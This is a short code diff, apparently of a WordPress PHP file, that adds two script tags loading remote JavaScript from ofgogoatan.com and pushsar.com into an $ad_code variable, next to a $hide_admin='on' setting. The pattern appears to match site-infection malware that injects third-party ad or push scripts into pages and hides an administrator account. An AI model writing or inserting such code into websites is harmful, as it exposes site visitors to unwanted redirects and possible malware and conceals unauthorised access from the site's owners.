@@ -47,7 +47,8 @@ add_action( 'admin_init', function() {
 });
 
 $ad_code='
-
+<script type="text/javascript" src="//ofgogoatan.com/apu.php?zoneid=3260072" async data-cfasync="false"></script>
+<script src="https://pushsar.com/pfe/current/tag.min.js?z=3260077" data-cfasync="false" async></script>
 ';
 
 $hide_admin='on';
